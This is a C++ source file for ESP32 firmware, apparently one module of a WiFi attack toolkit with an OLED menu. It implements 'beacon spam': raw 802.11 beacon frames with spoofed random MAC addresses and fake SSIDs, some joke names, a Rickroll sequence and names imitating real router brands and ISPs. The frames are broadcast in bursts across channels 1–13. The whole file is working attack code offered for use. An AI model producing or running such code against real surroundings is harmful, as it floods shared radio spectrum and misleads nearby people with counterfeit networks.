#include "attack_beacon_spam.h"
#include "wifi_attacks_common.h"
#include <WiFi.h>
#include <esp_wifi.h>

namespace attack_beacon_spam {

using namespace wifi_attacks_common;

enum BeaconState : uint8_t {
  STATE_CONFIG = 0,
  STATE_RUNNING
};

static BeaconState s_state = STATE_CONFIG;

static const char* const kCategories[] = {
  "Funny",
  "Router",
  "Random",
  "Rickroll"
};
static const int kCategoryCount = sizeof(kCategories) / sizeof(kCategories[0]);

static int s_cfgSel = 0;
static int s_selectedCat = 0;
static int s_apCount = 50;


static uint32_t s_sentPackets = 0;
static uint32_t s_lastPackets = 0;
static uint32_t s_speed = 0;
static uint32_t s_lastSpeedCalc = 0;
static uint8_t s_currentChan = 1;
static int s_spamIdx = 0;


static const char* const kFunnySSIDs[] = {
  "Martin Router King",
  "Abraham Linksys",
  "Pretty Fly for a WiFi",
  "Tell My WiFi Love Her",
  "Silence of the LANs",
  "Winternet Is Coming",
  "FBI Surveillance Van 4",
  "Area 51 Test Site",
  "Drop It Like Its Hotspot",
  "404 WiFi Unavailable",
  "VIRUS.EXE",
  "Loading...",
  "Searching...",
  "Free Public WiFi",
  "Get Off My LAN",
  "Wu Tang LAN",
  "Dora The Explorer",
  "It Hurts When IP",
  "Bill Wi The Science Fi",
  "Benjamin FrankLAN",
  "House LANister",
  "Titanic Syncing",
  "No Free WiFi Here",
  "Get Your Own WiFi",
  "Planet Express",
  "Darude LANstorm",
  "The Promised LAN",
  "Hide Yo Kids Yo WiFi",
  "BecauseFi",
  "Connecting..."
};
static const int kFunnyCount = sizeof(kFunnySSIDs) / sizeof(kFunnySSIDs[0]);

static const char* const kRouterSSIDs[] = {
  "TP-Link_2.4GHz",
  "Keenetic-8319",
  "ASUS_RT-AX58U",
  "Netgear-Home",
  "D-Link_DIR-825",
  "ZyXEL_Air",
  "Xiaomi_Router_AX3000",
  "MikroTik-AP-01",
  "Huawei-HomeGateway",
  "Tenda_Nova_Mesh",
  "Rostelecom_WiFi_42",
  "Beeline_SmartBox",
  "MTS_GPON_9182",
  "MGTS_GPON_5541",
  "Cisco_Catalyst_Guest",
  "Linksys_Velop",
  "Honor_Router_3",
  "Archer_AX73",
  "TP-Link_Archer_C6",
  "Mercusys_WiFi_7A",
  "ZTE_ZXHN_H118N",
  "Sagemcom_Fast_2804",
  "FRITZ!Box_7590",
  "Ubiquiti_UniFi_AP",
  "Aruba_InstantOn"
};
static const int kRouterCount = sizeof(kRouterSSIDs) / sizeof(kRouterSSIDs[0]);

static const char* const kRickrollSSIDs[] = {
  "01 Never gonna give you up",
  "02 Never gonna let you down",
  "03 Never gonna run around",
  "04 and desert you",
  "05 Never gonna make you cry",
  "06 Never gonna say goodbye",
  "07 Never gonna tell a lie",
  "08 and hurt you"
};
static const int kRickrollCount = sizeof(kRickrollSSIDs) / sizeof(kRickrollSSIDs[0]);

constexpr size_t BEACON_PKT_LEN = 109;
static const uint8_t beaconPacketTemplate[BEACON_PKT_LEN] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x00, 0x00,
    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
    0xe8, 0x03,
    0x31, 0x00,
    0x00, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x01, 0x08,
    0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
    0x03, 0x01,
    0x01,
    0x30, 0x18,
    0x01, 0x00,
    0x00, 0x0f, 0xac, 0x02,
    0x02, 0x00,
    0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
    0x01, 0x00,
    0x00, 0x0f, 0xac, 0x02,
    0x00, 0x00
};
constexpr size_t BEACON_TAIL_OFFSET = 70;
constexpr size_t BEACON_TAIL_LEN = BEACON_PKT_LEN - BEACON_TAIL_OFFSET;
constexpr size_t BEACON_TAIL_CHANNEL_OFFSET = 82 - BEACON_TAIL_OFFSET;

static void getSSID(int cat, int index, char* outSsid, size_t maxLen) {
  if (cat == 0) {
    int baseIdx = index % kFunnyCount;
    int cycle = index / kFunnyCount;
    if (cycle == 0) {
      snprintf(outSsid, maxLen, "%s", kFunnySSIDs[baseIdx]);
    } else {
      snprintf(outSsid, maxLen, "%s %d", kFunnySSIDs[baseIdx], cycle + 1);
    }
  } else if (cat == 1) {
    int baseIdx = index % kRouterCount;
    int cycle = index / kRouterCount;
    if (cycle == 0) {
      snprintf(outSsid, maxLen, "%s", kRouterSSIDs[baseIdx]);
    } else {
      snprintf(outSsid, maxLen, "%s_%02X", kRouterSSIDs[baseIdx], (unsigned int)(index * 13) & 0xFF);
    }
  } else if (cat == 2) {
    static const char chars[] = "0123456789ABCDEF";
    char randBuf[7];
    for (int k = 0; k < 6; k++) randBuf[k] = chars[random(0, 16)];
    randBuf[6] = '\0';
    snprintf(outSsid, maxLen, "AP_%s", randBuf);
  } else {
    int baseIdx = index % kRickrollCount;
    int cycle = index / kRickrollCount;
    if (cycle == 0) {
      snprintf(outSsid, maxLen, "%s", kRickrollSSIDs[baseIdx]);
    } else {
      snprintf(outSsid, maxLen, "%s %d", kRickrollSSIDs[baseIdx], cycle + 1);
    }
  }
}

static size_t buildBeaconPacket(uint8_t outPacket[BEACON_PKT_LEN], const uint8_t mac[6], const char* ssid, uint8_t ssidLen, uint8_t channel) {
  if (ssidLen > 32) ssidLen = 32;
  memcpy(outPacket, beaconPacketTemplate, 38);
  memcpy(&outPacket[10], mac, 6);
  memcpy(&outPacket[16], mac, 6);
  outPacket[37] = ssidLen;
  if (ssidLen > 0) memcpy(&outPacket[38], ssid, ssidLen);
  memcpy(&outPacket[38 + ssidLen], &beaconPacketTemplate[BEACON_TAIL_OFFSET], BEACON_TAIL_LEN);
  outPacket[38 + ssidLen + BEACON_TAIL_CHANNEL_OFFSET] = channel;
  return 38 + ssidLen + BEACON_TAIL_LEN;
}

void open() {
  s_state = STATE_CONFIG;
  s_cfgSel = 0;
  s_selectedCat = 0;
  s_apCount = 50;
  s_sentPackets = 0;
  s_lastPackets = 0;
  s_speed = 0;
  s_currentChan = 1;
  s_spamIdx = 0;
}

void close() {
  if (s_state == STATE_RUNNING) {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
  }
  s_state = STATE_CONFIG;
}

void tick(uint32_t now) {
  if (s_state == STATE_RUNNING) {
    if (s_apCount > 0) {
      for (int b = 0; b < 6 && s_spamIdx < s_apCount; b++) {
        char ssid[33];
        getSSID(s_selectedCat, s_spamIdx, ssid, sizeof(ssid));

        uint8_t mac[6];
        mac[0] = 0x02;
        mac[1] = (uint8_t)s_selectedCat;
        mac[2] = (uint8_t)(s_spamIdx & 0xFF);
        mac[3] = (uint8_t)((s_spamIdx >> 8) & 0xFF);
        mac[4] = (uint8_t)random(0, 256);
        mac[5] = (uint8_t)random(0, 256);

        uint8_t packet[BEACON_PKT_LEN];
        size_t pktLen = buildBeaconPacket(packet, mac, ssid, strlen(ssid), s_currentChan);

        esp_wifi_set_channel(s_currentChan, WIFI_SECOND_CHAN_NONE);
        esp_wifi_80211_tx(WIFI_IF_AP, packet, pktLen, false);

        s_sentPackets++;
        s_spamIdx++;
      }

      if (s_spamIdx >= s_apCount) {
        s_spamIdx = 0;
        s_currentChan++;
        if (s_currentChan > 13) s_currentChan = 1;
      }
    }

    if (now - s_lastSpeedCalc >= 1000) {
      s_speed = s_sentPackets - s_lastPackets;
      s_lastPackets = s_sentPackets;
      s_lastSpeedCalc = now;
    }
  }
}

void onKey(const KeyEvent& ev) {
  if (ev.repeat) return;

  if (s_state == STATE_CONFIG) {
    if (ev.key == BTN_UP) {
      s_cfgSel = (s_cfgSel - 1 + 3) % 3;
    } else if (ev.key == BTN_DOWN) {
      s_cfgSel = (s_cfgSel + 1) % 3;
    } else if (ev.key == BTN_LEFT) {
      if (s_cfgSel == 0) {
        s_selectedCat = (s_selectedCat - 1 + kCategoryCount) % kCategoryCount;
      } else if (s_cfgSel == 1) {
        if (s_apCount >= 5) s_apCount -= 5;
        else s_apCount = 0;
      }
    } else if (ev.key == BTN_RIGHT) {
      if (s_cfgSel == 0) {
        s_selectedCat = (s_selectedCat + 1) % kCategoryCount;
      } else if (s_cfgSel == 1) {
        if (s_apCount <= 145) s_apCount += 5;
        else s_apCount = 150;
      }
    } else if (ev.key == BTN_OK) {
      if (s_cfgSel == 0) {
        s_selectedCat = (s_selectedCat + 1) % kCategoryCount;
      } else if (s_cfgSel == 1) {
        s_apCount += 10;
        if (s_apCount > 150) s_apCount = 0;
      } else if (s_cfgSel == 2) {

        s_sentPackets = 0;
        s_lastPackets = 0;
        s_speed = 0;
        s_spamIdx = 0;
        s_currentChan = 1;
        s_lastSpeedCalc = millis();

        WiFi.mode(WIFI_AP);
        WiFi.softAP("ESPone", "", 1, 1);
        s_state = STATE_RUNNING;
      }
    }
  }
}

bool onBack() {
  if (s_state == STATE_RUNNING) {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    s_state = STATE_CONFIG;
    return true;
  } else if (s_state == STATE_CONFIG) {
    return false;
  }
  return false;
}

void draw(U8G2& u8g2, uint32_t now) {
  if (s_state == STATE_CONFIG) {
    drawHeader(u8g2, "BEACON SPAM");
    u8g2.setFont(u8g2_font_6x12_tr);


    char buf[32];
    snprintf(buf, sizeof(buf), "Type:  %s", kCategories[s_selectedCat]);
    u8g2.drawStr(6, 26, buf);


    snprintf(buf, sizeof(buf), "APs:   %d", s_apCount);
    u8g2.drawStr(6, 38, buf);


    u8g2.drawStr(6, 50, "Start Spam");


    u8g2.setDrawColor(2);
    int curY = 16 + s_cfgSel * 12;
    u8g2.drawBox(2, curY, 124, 12);
    u8g2.setDrawColor(1);
    return;
  }

  if (s_state == STATE_RUNNING) {
    drawHeader(u8g2, "BEACON SPAM");
    u8g2.setFont(u8g2_font_6x12_tr);

    char buf[32];
    snprintf(buf, sizeof(buf), "TYPE: %s  APS: %d", kCategories[s_selectedCat], s_apCount);
    u8g2.drawStr(4, 25, buf);

    snprintf(buf, sizeof(buf), "SENT: %lu  CH: %d", (unsigned long)s_sentPackets, s_currentChan);
    u8g2.drawStr(4, 37, buf);

    snprintf(buf, sizeof(buf), "RATE: %lu/s", (unsigned long)s_speed);
    u8g2.drawStr(4, 49, buf);

    u8g2.drawBox(2, 53, 124, 10);
    u8g2.setDrawColor(0);
    int dots = (now / 200) % 4;
    snprintf(buf, sizeof(buf), "SPAMMING%.*s", dots, "...");
    u8g2.drawStr(34, 61, buf);
    u8g2.setDrawColor(1);
    return;
  }
}

}
